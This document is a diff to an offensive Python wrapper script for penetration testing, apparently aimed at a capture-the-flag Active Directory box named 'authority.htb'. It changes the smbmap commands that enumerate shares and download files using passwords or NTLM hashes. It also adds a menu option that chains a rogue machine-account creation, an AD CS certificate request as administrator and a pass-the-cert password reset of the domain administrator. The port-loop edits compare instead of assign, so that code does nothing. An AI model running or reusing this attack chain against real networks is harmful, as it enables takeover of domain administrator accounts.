@@ -332,7 +332,7 @@ def getTCPorts():
       localCOM("awk -F ',' '{print NF-1}' sorted1.tmp > num1.tmp")
       loopMax = int(linecache.getline("num1.tmp", 1).rstrip("\n"))
       if loopMax > screenLength:
-         loopMax == screenLength
+         loopMax == screenLength-1
       this_Ports1 = linecache.getline("sorted1.tmp", 1).rstrip("\n")        
       for loop1 in range(0, loopMax):
          for x1 in this_Ports1.split(","):
@@ -376,7 +376,7 @@ def getUDPorts():
       localCOM("awk -F ',' '{print NF-1}' sorted2.tmp > num2.tmp")
       loopMax = int(linecache.getline("num2.tmp", 1).rstrip("\n"))
       if loopMax > screenLength:
-         loopMax == screenLength
+         loopMax == screenLength-1
       this_Ports2 = linecache.getline("sorted2.tmp", 1).rstrip("\n")        
       for loop2 in range(0, loopMax):
          for x2 in this_Ports2.split(","):
@@ -2146,6 +2146,7 @@ while True:
             cutLine("NT_STATUS_ACCESS_DENIED","shares2.tmp")
             cutLine("NT_STATUS_ACCOUNT_DISABLED","shares2.tmp")
             cutLine("NT_STATUS_CONNECTION_RESET","shares2.tmp")
+            cutLine("NT_STATUS_RESOURCE_NAME_NOT_FOUND","shares2.tmp")
             cutLine("Reconnecting with SMB1","shares2.tmp")
             cutLine("Sharename","shares2.tmp")
             cutLine("---------","shares2.tmp")
@@ -2190,18 +2191,18 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print(colored("[*] Checking OS...", colour3))
-            remoteCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
+            remoteCOM("smbmap --no-banner -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" "))      
             print(colored("[*] Checking command privilege...", colour3))
-            remoteCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
+            remoteCOM("smbmap --no-banner -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" "))      
             print(colored("[*] Mapping Shares...", colour3))
-            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
+            remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -s " + TSH.rstrip(" ") + " --depth 15")      
          else:
             print(colored("[*] Checking OS...", colour3))
-            remoteCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+            remoteCOM("smbmap --no-banner -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" "))
             print(colored("[*] Checking command privilege...", colour3))
-            remoteCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))         
+            remoteCOM("smbmap --no-banner -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" "))         
             print(colored("[*] Mapping Shares...", colour3))
-            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
+            remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -s " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
             cutLine("[+]","mapped.tmp")
             parsFile("mapped.tmp")
             catsFile("mapped.tmp")
@@ -2231,10 +2232,10 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
+            remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -r " + TSH.rstrip(" ") + " --depth 15")
          else:
             print("[+] Downloading any found files...")
-            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
+            remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + "  -r " + TSH.rstrip(" ") + " --depth 15") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4342,7 +4343,38 @@ while True:
       localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCOM("xdotool type 'bloodhound'; xdotool key Return")
       localCOM("xdotool key Ctrl+Tab") 
-      prompt()     
+      prompt()    
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy parsFile
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='701':
+      print(colored("[*] Checking privilges...", colour3))      
+      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+      catsFile("priv.tmp")
+      with open("priv.tmp") as file:
+         contents = file.read()
+         if "SeMachineAccountPrivilege" in contents:
+            print(colored("[*] Creating new Domain Computer...", colour3))
+            localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 authority.htb/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip " + TIP.rstrip(" "))
+#             print(colored("[*] Checking certificate authorities...", colour3))            
+#             localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout > test.tmp")
+#             localCOM("cat test.tmp | grep  'Certificate Authorities'")
+#             authority = input("\n[?] Please enter authority name to assign: ")
+#             print("") 
+            localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn administrator@authority.htb -template CorpVPN -debug")
+            localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
+            localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
+            localCOM("python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action whoami")
+            localCOM("python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action modify_user -target administrator -new-pass hackeD1!")
+         else:
+            print("[-] SeMachineAccountPrivilege is not enabled...")
+      prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
